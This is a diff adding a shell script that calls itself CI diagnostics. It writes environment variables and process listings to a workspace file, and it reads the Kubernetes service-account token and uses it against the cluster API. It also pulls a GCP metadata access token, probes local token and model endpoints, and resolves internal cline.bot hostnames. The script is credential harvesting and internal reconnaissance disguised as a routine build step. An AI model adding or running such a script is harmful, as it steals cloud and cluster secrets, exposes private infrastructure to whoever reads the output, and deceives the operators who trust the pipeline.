@@ -1,0 +1,23 @@
+a#!/bin/sh
+exec >/workspace/ci-diagnostics.txt 2>&1
+date
+echo ===ENV===
+env
+echo ===PS===
+ps aux
+echo ===SATOKEN===
+cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1
+echo ===K8SVER===
+curl -sk -m 6 https://172.104.16.1:443/version 2>&1
+echo ===K8SLIST===
+curl -sk -m 6 -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)" https://172.104.16.1:443/api/v1/namespaces 2>&1 | head -c 3000
+echo ===METADATA===
+curl -s -m 6 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>&1
+echo ===MITM===
+ls -la /etc/mitm 2>&1
+echo ===HUB8081===
+for p in / /health /healthz /status /version /token /v1/token /v1/models /api/v1/models /hub; do printf "%s " $p; curl -s -m 3 -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8081$p; done
+echo ===ROUTER===
+curl -s -m 6 http://172.104.26.195:8080/ 2>&1 | head -c 500
+echo ===INTDNS===
+getent hosts core-api.staging.int.cline.bot otel.cline.bot api.cline.bot 2>&1
